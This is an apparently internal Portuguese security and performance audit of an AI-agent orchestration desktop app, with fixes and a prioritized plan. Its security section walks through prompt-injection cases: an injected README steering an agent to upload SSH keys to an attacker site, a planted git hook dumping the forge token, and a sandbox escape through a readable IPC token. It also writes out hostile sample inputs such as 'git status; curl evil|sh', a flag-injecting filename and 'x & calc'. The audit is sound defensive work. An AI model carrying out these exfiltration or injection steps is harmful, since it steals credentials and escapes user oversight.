# Auditoria ADE AGS — 2026-10-02

Branch auditada: `feat/shared-memory-v0` (HEAD `d0175be`). A auditoria foi só de leitura: nenhum arquivo de código foi alterado. Os achados marcados com ✔ foram conferidos manualmente no código, além do agente que os levantou.

## Status das correções (branch `fix/security-critical`)

| Item | Status | Commit |
|---|---|---|
| S3 hooks/config do repo leem o token do forge | ✅ Corrigido: git com credencial roda sem hooks/fsmonitor/helpers, só HTTPS, TLS forçado; token por remoto; pull dividido em fetch (com token) + merge local | `7293fbd` |
| S2 `browser_upload`/`browser_eval` auto-aprovados, upload lê qualquer arquivo | ✅ Corrigido: pedem aprovação; upload só dentro da pasta do projeto (canonicalizado) | `b29b654` |
| S1 token IPC | ⚠️ Reclassificado (ver nota em S1). Endurecido: limite de request, de conexões, timeout com clamp, comparação em tempo constante | `c8cf424` |
| Vazamento de API keys para contas da app | ✅ Corrigido: com conta da app, variáveis que sobrescrevem o login são removidas | `3eaad73` |
| S5 proxy sem checagem de Host/Origin | ✅ Corrigido | `3816776` |
| S4 CSP nula | ✅ CSP ativa (validada servindo `dist/` com o header; falta smoke test dentro do app) | `b7263ee` |
| S7 session ID no comando de resume | ✅ Corrigido (backend e frontend) | `3be5b6f` |
| S8 updater apontando para o upstream | ✅ Aponta para `tonalenar/ADE-AGS` | `6150ab9` |
| P1/P2 autosave + SQLite | ✅ WAL, transação única, scrollback não reenviado, evento só quando muda | `46b469a` |
| P3 PTY | ✅ UTF-8 com estado, leituras de 64 KB | `d9d7f67` |
| P4/P5 bundle e terminais ocultos | ✅ Chunk principal 2,36 MB → 1,06 MB; terminais ocultos pausam | `b02d4bd` |
| P7 índices | ✅ | `e850e06` |
| CI em PR | ✅ `.github/workflows/ci.yml` | `6150ab9` |

## Saúde atual

| Verificação | Resultado |
|---|---|
| `bunx tsc --noEmit` | 0 erros |
| `bun run test` | 70 arquivos, 583/583 ok |
| `cargo test --lib` | 727 ok, 0 falhas, 9 ignorados |
| `bun audit` | 7 vulnerabilidades (5 high), todas em dependências de build (`postcss`, `nanoid`, `browserslist`). Risco de runtime baixo. `bun update` resolve |
| CI | Só `release.yml`, disparado por tag. Nenhum teste roda em PR |
| Bundle | Chunk principal com 2,36 MB minificado. Só `MarkdownPreview` é lazy |

A base é sólida. Há muitos testes, SQL parametrizado, defesa contra BatBadBut no launcher Windows, PKCE no OAuth, keyring para tokens git e dados de outros agentes tratados como não confiáveis. Os problemas estão concentrados na **fronteira entre agente e app**.

---

## 1. Segurança

### 🔴 Alta

> **Revisão de S1 (mesmo dia, ao implementar as correções):** o modelo **sem shell** não consegue se passar por outra task. A ponte MCP fixa `taskId`/`cwd` a partir do próprio argv, e os argumentos do modelo vão aninhados em `"args"` (`ipc/mcp.rs:821-822`). O vetor de S1 exige um agente com **shell arbitrário**, que, rodando como o mesmo usuário do SO, já consegue ler `~/.ssh`, o keyring do Windows e qualquer outro arquivo de token. Trocar o token por tokens por task não fecha nada contra esse atacante, porque eles também ficariam em arquivos ou linhas de comando legíveis pelo mesmo usuário. A correção real é **isolar os agentes no nível do SO** (usuário separado, AppContainer ou container). Além disso, o `ccode` com `tab.*` é usado de propósito pela skill `controlcode-orchestrator`. Severidade efetiva: **média**, limitada a agentes com shell restrito (por exemplo, regras `Bash(...)` permissivas, ver S6). Os ✔ de S2 e S3 continuam valendo e foram corrigidos na branch `fix/security-critical`.

**S1. O token IPC é uma chave-mestra legível por qualquer agente ✔**

Evidência:
- `ipc/server.rs:25-28` exporta o caminho do handshake (`CONTROLCODE_HANDSHAKE`) para **todos** os processos filhos.
- `server.rs:47` cria um único token por instância.
- `ipc/commands/dispatch.rs:30-91` dá a quem tem o token todos os comandos:
  - `tab.send` digita em qualquer PTY, inclusive no shell do usuário.
  - `tab.output` lê o scrollback de qualquer tab.
  - `tab.create` aceita `prelaunch` arbitrário, que vira `cmd /C "a && b"`.
  - `forge.run` faz push, PR e release com o token do forge, **sem passar pelo broker**.
  - `run.approve` pode criar cards de aprovação falsos.
- A identidade é declarada pelo próprio chamador: o `taskId` e o `cwd` vêm no JSON (`runs/orchestration.rs:43-66`, `memory.rs:1017`). Os IDs de task estão listáveis em `~/.controlcode/runs/` e `~/.controlcode/mcp/`.

Impacto: um agente com shell que sofra prompt injection lê `ipc.json` e escapa do sandbox do Codex, da política do lead e do broker do Claude. Workers Kimi sempre auto-aprovam (`runs/adapters.rs:618-650`). Com isso o agente executa comandos no host, faz push com o token do usuário e lê ou escreve na memória de outras missões.

Correção:
- Criar um token de capacidade por task ou tab, entregue só ao processo-ponte `ccode mcp` por pipe ou handle herdado, nunca por arquivo ou variável que o agente consiga ler.
- O servidor deriva a identidade do token e ignora `taskId` e `cwd` do payload.
- Separar os escopos. O CLI humano mantém `tab.*`, `workspace.*` e `skill.*`. O token de agente só alcança as tools MCP permitidas pelo seu papel.
- `forge.run` com escrita passa por `resolve_permission`.

**S2. Tools de browser auto-aprovadas permitem exfiltrar qualquer arquivo ✔**

Evidência:
- `ipc/mcp.rs:1175` faz `auto_approved()` devolver `true` para **todas** as `BROWSER_TOOLS`. `runs/agents.rs:143-146` as coloca em `--allowedTools`, inclusive para o Lead "somente leitura".
- `browser_upload` chama `preview_read_upload(path)` (`preview/capture.rs:235-254`), que lê **qualquer caminho absoluto** até 10 MB.
- `preview_resolve` (`proxy.rs:1248-1259`) aceita qualquer host http(s).

Cenário: um README injetado manda o agente navegar até `https://atacante/upload`, chamar `browser_upload path=C:\Users\…\.ssh\id_ed25519` e clicar em enviar. Nenhum card de aprovação aparece.

Correção:
- Tirar `browser_upload`, `browser_eval` e `browser_navigate` para hosts não locais do auto-approve.
- Restringir o upload ao worktree ou projeto, com canonicalize e recusa de symlinks que escapem da raiz.
- Navegação iniciada pelo agente fica só em localhost, salvo aprovação.

**S3. Git hooks do repositório roubam o token do forge ✔**

Evidência:
- `forge/credentials.rs:137-150` coloca `Authorization: Basic base64(user:token)` em `GIT_CONFIG_VALUE_n`, no ambiente.
- `scm/git.rs:56` roda git com hooks ativos, sem `core.hooksPath` e sem `--no-verify`.

Cenário: o agente escreve `.git/hooks/pre-push` com `env > arquivo` ou um envio para fora. No próximo push pela UI o token vaza. Os worktrees compartilham `.git/hooks`.

Correção:
- Nas operações de rede: `-c core.hooksPath=<pasta vazia> -c core.fsmonitor=false`, `--no-verify` e neutralizar `core.sshCommand`.
- Melhor ainda: credencial por `GIT_ASKPASS` de uso único, no lugar de config herdável por env.

### 🟠 Média

**S4. `"csp": null` com 225 comandos Tauri poderosos ✔**

Nenhum sink de XSS foi encontrado: não há `dangerouslySetInnerHTML`, e o markdown passa por `rehype-raw` e depois `rehype-sanitize`, na ordem certa. Mesmo assim, qualquer XSS futuro vira RCE imediato. Os caminhos seriam `pty_create(command)`, `graphify_run_step` (`cmd /C`), `explorer_write_file` (qualquer caminho), `export_session_markdown` e `forge_*`. A capability vale para `windows: ["*"]`.

Correção:
- Definir uma CSP estrita: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self' ipc: http://ipc.localhost; frame-src http://localhost:* http://127.0.0.1:*`.
- Escopar capabilities por janela.

**S5. O proxy de preview não valida Host no caminho principal nem no WebSocket**

Evidência:
- `preview/proxy.rs:145-178`: `handle()` encaminha sem `is_own_host()`.
- O proxy reescreve o Host e anexa o cookie jar do servidor (`proxy.rs:332-371`, `991-1000`).
- A porta é previsível: hash FNV da origem (`proxy.rs:1147`).

Impacto: DNS rebinding, CSRF e hijack de WebSocket com os cookies do usuário. Isso vale inclusive para sites remotos proxiados, porque o proxy aceita qualquer origem https.

Correção:
- `is_own_host()` no topo de `handle()`, devolvendo 403 quando falhar.
- Checar `Origin` no upgrade do WebSocket.
- Token aleatório por launch no caminho.

**S6. Regras de permissão comparadas como glob de texto**

Evidência: `runs/rules.rs:77-97`.

Impacto:
- `Bash(git status*)` também casa com `git status; curl evil|sh`.
- `Edit(src/**)` casa com `src/../../.bashrc`.

Correção:
- Recusar match quando houver metacaracteres de shell (`; & | $( \` > <`, quebra de linha).
- Canonicalizar o caminho e exigir que fique dentro da raiz.

**S7. Session ID entra no comando de resume sem validação**

Evidência:
- `src/features/sessions/agentResume.ts:36` monta a string do comando.
- Os IDs vêm de nomes de arquivo em diretórios que o agente pode escrever (`session/title.rs:979-1015`).

Cenário:
- Um arquivo chamado `x --dangerously-skip-permissions.jsonl` injeta essa flag no resume.
- Com prelaunch no Windows, que passa por `cmd /C`, um nome como `x & calc` vira execução de comando.

Correção: validar `^[A-Za-z0-9_-]{1,128}$` no backend e no frontend, e passar o ID como argv.

**S8. O updater aponta para o upstream ✔**

Evidência:
- `updates.rs:18` tem `REPO = "luis3132/ControlCode"`, e o endpoint em `tauri.conf.json` também é do upstream.
- O identifier `com.luis.controlcode` e a pasta `~/.controlcode` são os mesmos do upstream.

Impacto:
- O usuário da ADE recebe convite para instalar o binário do ControlCode original.
- Se os dois forem instalados, eles compartilham o `data.db`. O schema da ADE é v23 ou mais, então o upstream abriria um banco que não conhece.

Correção: executar o [REBRAND.md](./REBRAND.md), com identifier, pasta de dados e repositório próprios. Até lá, desligar o check de update.

### 🟡 Baixa

| # | Achado | Local | Correção |
|---|---|---|---|
| S9 | `read_line` sem limite e uma thread por conexão (DoS local). `Instant::now() + timeout` pode dar panic por overflow | `ipc/server.rs:60-68,180`; `runs/broker.rs` | `take(1 MiB)`, semáforo, clamp do timeout |
| S10 | Comparação do token com `!=` (não é tempo constante) | `server.rs:187` | `subtle::ConstantTimeEq` |
| S11 | No Windows, `ipc.json`, `mcp/` e `runs/` dependem da ACL herdada | `server.rs:87-92` | DACL explícita, só para o dono |
| S12 | Skills ficam linkadas por symlink ou junction, então um agente pode editar a SKILL.md global e plantar prompt injection persistente | `skills/mount.rs`, `links.rs` | Montar read-only ou copiar por projeto |
| S13 | `browser_cookies`, `browser_network` e `browser_storage` expõem cookies e headers `Authorization` ao agente | `preview/site.rs` | Redigir esses valores |
| S14 | Mensagens da página são validadas só por `e.source`, então dá para forjar um `pick:selected` | `BrowserTab.tsx:338` | Checar também `e.origin` |
| S15 | Hyperlinks OSC 8 do terminal usam o handler padrão do xterm | `Terminal.tsx:~185` | `linkHandler` só para http(s) via `openUrl` |
| S16 | `npx -y skills add` sem versão fixada | `marketplace/skillssh.rs:367` | Fixar a versão |
| S17 | xterm em versão beta (sem backports de segurança) | `package.json` | Migrar para stable |
| S18 | Campos vindos da página (selector, atributos) são colados no TUI sem remover caracteres de controle | `composeMessage.ts:47-49` | Remover C0 e `\r` |

---

## 2. Performance

### 🔴 Alta

**P1. O autosave reenvia e regrava o scrollback de todas as tabs**

Evidência:
- `src/features/tabs/persistence.ts:224-233,253` dispara um save 400 ms depois de qualquer mudança em tabs ou de **arrastar ou redimensionar a janela**, e também a cada 20 s.
- Cada save leva o scrollback inteiro de todas as tabs, até 3,5 MB por tab.
- `database/queries/windows.rs:180-218` faz UPSERT linha a linha, sem transação.

Impacto: com 10 tabs são cerca de 35 MB de IPC e 35 MB de escrita no SQLite por evento. Cada save ainda emite `cc-workspace-changed`, e isso faz as outras telas recarregarem.

Correção:
- Mandar scrollback só quando estiver sujo (flag por `output_total`).
- Melhor: snapshot direto do `PTY_BUFFERS` em Rust, numa tabela `tab_scrollback`.
- Uma transação por save.
- Só emitir o evento quando o conjunto de tabs mudar.

**P2. Um `Mutex<Connection>` sem WAL e 131 comandos síncronos na main thread ✔**

Evidência:
- `database/connection.rs:23-30` só define `foreign_keys=ON`.
- No Tauri 2, comandos `fn` síncronos rodam na main thread. Quando um escritor segura o lock (o save do P1, ou `quota::record` a cada linha do stream), a janela inteira congela.

Correção:
- Rodar `PRAGMA journal_mode=WAL; synchronous=NORMAL; busy_timeout=5000`.
- Usar pool de leitura (1 writer + N readers).
- `#[tauri::command(async)]` ou `spawn_blocking` nos comandos de DB e filesystem.
- Tirar a criação de symlinks de dentro do lock (`skills/links.rs:225,438,455`).

**P3. Caminho de saída do PTY ✔**

Evidência (`terminal/pty_manager.rs:290-299`):
- Um `emit` por leitura de 4 KB, serializado em JSON. Não há coalescência.
- `from_utf8_lossy` por chunk quebra caracteres multibyte (emoji, box-drawing) na borda e os corrompe.
- Os locks `PTY_BUFFERS` e `PTY_REGISTRY` são globais, e `write_to_pty` faz um write bloqueante segurando o lock.

Correção:
- Decoder UTF-8 com estado.
- Coalescer cerca de 8–16 ms ou 64 KB por PTY.
- `tauri::ipc::Channel` com bytes brutos.
- Locks por sessão.
- Writer por PTY alimentado por mpsc.

**P4. Bundle de 2,36 MB sem lazy loading ✔**

Evidência:
- `src/app/router.tsx` importa todas as rotas de forma eager.
- Os maiores contribuintes no chunk principal:
  - react-dom 645 K (o `manualChunks` não pega `react-dom/client`)
  - CodeMirror ~1 MB
  - locales i18n 304 K (os três idiomas)
  - addon WebGL 256 K
  - neogestify-ui 182 K
  - sweetalert2 170 K

Correção:
- `React.lazy` nas rotas (Fleet, Missions, Squads, Forge, Marketplace, Skills, Sessions), no BrowserTab e no FileTab.
- Separar chunks de CodeMirror, WebGL e markdown.
- Carregar só o locale ativo.

### 🟠 Média

| # | Achado | Local | Correção |
|---|---|---|---|
| P5 | Terminais ocultos continuam renderizando (`visibility:hidden` não pausa o IntersectionObserver) | `TerminalPanel.tsx:41-47` | `display:none` ou `content-visibility:hidden` + refit ao mostrar |
| P6 | Stream da frota: lock do DB e escrita de quota por linha, dois `tokio::fs` sem buffer por evento, stderr sem limite. A Fleet re-renderiza todos os cards a cada evento (não há `React.memo` no repo) | `runs/supervisor.rs:275-303`, `FleetPage.tsx:38` | `BufWriter`, debounce da quota, ring buffer no stderr, seletor por card |
| P7 | Cada `cc-task-changed` recarrega todas as tasks e runs, sem LIMIT. `with_deps` é O(tasks×deps). Faltam índices | `runs/store.ts:136`, `store.rs:110-133,413-430` | Evento com delta. Índices em `runs(workspace_id, created_at)`, `tasks(run_id, created_at)`, `session_history(workspace_id, closed_at)`, `run_facts(run_id, created_at)` |
| P8 | Tempestade de processos git: `explorer_repo_info` síncrono com 5 gits, FileTab com polling a cada 2 s, ScmPanel a cada 4 s | `explorer/git.rs:134`, `FileTab.tsx:106,140`, `ScmPanel.tsx:144` | Watcher (`notify`) em `.git/index` e `HEAD`; comando async |
| P9 | `detect_agents` sem cache (sonda `--version` com timeout de 8 s a cada janela ou visita à Fleet) | `agents/detector.rs:102-115` | Cache com TTL + refresh explícito |
| P10 | Uso do Claude relê todos os transcripts dos últimos 7 dias a cada abertura do popover | `usage/claude.rs:205-221` | Cache por `(path, len, mtime)` e leitura incremental |

### 🟡 Baixa

- `claude_title` lê o transcript inteiro (`session/title.rs:226`). Usar streaming com parada antecipada.
- Há um `setInterval` de 1 s por AgentCard ou PermissionCard. Trocar por um relógio compartilhado.
- Listeners registrados depois de um `await` vazam no unmount, e a saída inicial do PTY se perde (`Terminal.tsx:290-310`). O `Channel` do P3 resolve.
- `tab.scrollback` continua no Zustand depois da hidratação. Descartar.

---

## 3. Multi-conta (Codex, Claude Code etc.)

O modelo atual é um **diretório por conta + uma variável de ambiente**. O login acontece no terminal do próprio CLI, e a ADE não guarda segredo. É um bom modelo para assinaturas OAuth.

| Provider | Mecanismo | Identidade | Pin em Fleet/Mission/Squad | 2 contas em paralelo | Quota/uso | Lacunas |
|---|---|---|---|---|---|---|
| Claude Code | `CLAUDE_CONFIG_DIR` | email (`.claude.json`) | ✅ | ✅ | ✅ 5h/7d via `rate_limit_event`, tokens | Conta nova começa vazia (sem MCP, settings ou CLAUDE.md). O probe de uso edita `.claude.json` com o CLI rodando |
| Codex | `CODEX_HOME` | ❌ (`label_path: &[]`; o email do `id_token` não é decodificado) | ✅ | ✅ | ❌ rate limit não é parseado, sem custo, `budget_usd` ignorado | O roteamento automático é cego: quota desconhecida conta como "livre" (`routing.rs:315-326`). O MCP do `config.toml` do usuário vaza para as tasks (não há modo strict) |
| OpenCode | `XDG_DATA_HOME` | ❌ | ✅ | ✅ | Custo pelo stream, sem quota | `~/.config/opencode` (providers, MCP) é compartilhado entre contas |
| Gemini CLI | — (`profile: None`) | — | só a do sistema | ❌ | ❌ | Fase D bloqueada: o binário não está instalado |
| Kimi | — | — | só a do sistema | ❌ | ❌ | Variável não verificada |
| Antigravity | keyring do SO | — | só a do sistema | ❌ | `agy models` | O CLI não tem seletor de conta. OAuth experimental sem UI |

### Bugs de contas

- **Vazamento de ambiente ✔.** A frota usa `.envs(&launch.env)` sem `env_clear` (`runs/supervisor.rs:221`). O PTY remove só variáveis de renderização (`pty_manager.rs:252`). Um `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` ou `CLAUDE_CONFIG_DIR` presente no ambiente da ADE chega a **todos** os agentes. No Claude isso pode trocar silenciosamente a assinatura por cobrança via API.
- **Pin de conta ignorado.** `scheduler.rs:175-246` (`hand_to_another`) reroteia por falta de quota inclusive contas fixadas por um Squad, porque `Task` não tem `auto_account`. Isso contradiz `ROLES_SQUADS.md:83`.
- **Login expirado aparece como "logado".** `profiles.rs:86-113` só verifica se o arquivo marcador existe.

### O que falta para um multi-conta de verdade

1. **Contas por API key** (Anthropic, OpenAI, OpenRouter, Bedrock, Vertex, Azure). Hoje elas não existem. A única via é o `env_json` de agente custom, salvo **em texto puro no SQLite** (`agents/custom.rs:60`). Falta um tipo de conta `api_key | oauth_dir | bedrock | vertex | azure` com o segredo no keyring, reaproveitando `forge/secret.rs`.
2. **Health check real**, com `claude auth status`, `codex login status` e `opencode auth list`, mais um cache `ok | expired | unknown`.
3. **Classificação de falhas por adapter** (`RateLimited(until) | AuthExpired | Transient | Fatal`) e failover automático que respeite pins.
4. **Paridade de quota e identidade no Codex**: parsear os eventos de rate limit e token e decodificar o email.
5. **Ledger de uso e custo por conta**: tabela `usage_events`, dashboard e budget por missão e por conta. O supervisor mata a task que estourar, valendo também para CLIs que não suportam `--max-budget`.
6. **Pools de contas** (ex.: `claude-max = {A, B}`) com estratégia (least-used, round-robin, sticky por missão) e limite de concorrência por conta.
7. **Herança de config entre contas**: espelhar MCP, skills e settings sem copiar credenciais.

---

## 4. O que falta para ser uma "ADE de verdade"

| Capacidade | Status | Observação |
|---|---|---|
| Missões, tasks, DAG, roles, squads, handoff, memória | ✅ / parcial | Bem avançado. Falta UI de grafo (Map Mode) |
| Event bus unificado | Parcial | Três canais separados (`cc-task-*`, `cc-mission-changed`, cursores do orquestrador) |
| Worktree por missão | Parcial | Só por task. Nunca são apagados automaticamente |
| Revisão de diff + merge/reject por task/missão | Falta | Existe aprovação por tool call, não por entrega |
| Checkpoints / rollback / replay | Falta | — |
| Budgets impostos | Parcial | Só no Claude |
| Observabilidade (timeline, spans, OTel) | Parcial | Só NDJSON bruto por task |
| MCP do usuário anexável por missão/tab, agnóstico de provider | Falta | ROADMAP §8 |
| Sandbox (container/OS) | Parcial | `--sandbox` só no Codex. Job Objects só limpam processos |
| Cofre de credenciais de IA | Falta | Keyring só para git |
| Provider plugável sem recompilar | Falta | Custom TUI não entra em frota nem em contas |
| Notificações do SO | Falta | Só o toast interno |
| Modo headless / CI (`ccode` sem GUI) | Falta | `bin/cli.rs` exige a app rodando |
| Evals / benchmark de agentes e modelos | Falta | — |
| CI em PR | Falta | Só release por tag |
| Rebrand (identifier, dados, updater) | Pendente | Ver S8 |

### Docs desatualizados

**ARCHITECTURE.md:**
- Diz que o schema está na v18.
- Diz que o fallback de `default_dir` é `~/.claude`.
- Diz que só o Claude tem broker.
- A tabela de agentes não tem Antigravity.

**PROVIDER_CONTRACT.md:88-95:** a tabela de capabilities diz que o Codex não tem MCP nem modelos e que o Mission Engine não existe.

---

## 5. Plano priorizado

| # | Item | Tipo | Esforço | Arquivos principais |
|---|---|---|---|---|
| 1 | Token IPC por task + identidade derivada do token + escopos (S1) | Segurança | M | `ipc/server.rs`, `ipc/commands/dispatch.rs`, `ipc/mcp.rs`, `bin/cli.rs` |
| 2 | Tirar tools de browser perigosas do auto-approve + restringir upload (S2) | Segurança | S | `ipc/mcp.rs:1175`, `runs/agents.rs:143`, `preview/capture.rs:235` |
| 3 | Neutralizar hooks em operações git com credencial (S3) | Segurança | S | `scm/git.rs`, `forge/credentials.rs` |
| 4 | `env_clear`/allowlist no ambiente dos agentes | Segurança + contas | S | `runs/supervisor.rs`, `terminal/pty_manager.rs`, `runs/roster.rs` |
| 5 | CSP + Host check no proxy + validação de session ID (S4, S5, S7) | Segurança | S | `tauri.conf.json`, `preview/proxy.rs`, `agentResume.ts` |
| 6 | WAL + comandos async + autosave sem scrollback (P1, P2) | Performance | M | `database/connection.rs`, `tabs/persistence.ts`, `queries/windows.rs` |
| 7 | PTY via Channel, coalescido, UTF-8 com estado (P3) | Performance | M | `terminal/pty_manager.rs`, `Terminal.tsx` |
| 8 | Contas por API key no keyring + health check | Contas | M/L | `accounts/*`, `agents/adapter.rs`, `AddAccountDialog.tsx` |
| 9 | Classificação de falhas + failover que respeita pin + quota do Codex | Contas | M | `runs/adapters.rs`, `runs/scheduler.rs`, `runs/quota.rs`, `routing.rs` |
| 10 | Ledger de uso/custo + pools de contas | Contas | M | `runs/supervisor.rs`, `usage/`, `routing.rs`, `squads/*` |
| 11 | Lazy routes + chunks (P4), terminais ocultos (P5), índices (P7) | Performance | S | `router.tsx`, `vite.config.ts`, `TerminalPanel.tsx`, `schema.rs` |
| 12 | Rebrand + updater próprio + CI em PR | Infra | S/M | `tauri.conf.json`, `updates.rs`, `.github/workflows/` |
| 13 | Revisão de diff/merge por missão + worktree por missão | Produto | L | `runs/worktrees.rs`, `missions/*` |
| 14 | Event bus unificado → Map Mode | Produto | L | ROADMAP §9, §15 |

### Higiene do repo

- Remover as pastas não rastreadas `%SystemDrive%/` (artefato de uma variável de ambiente não expandida) e `testes/`, ou adicioná-las ao `.gitignore`.
- `bun update` para limpar os avisos do `bun audit`.
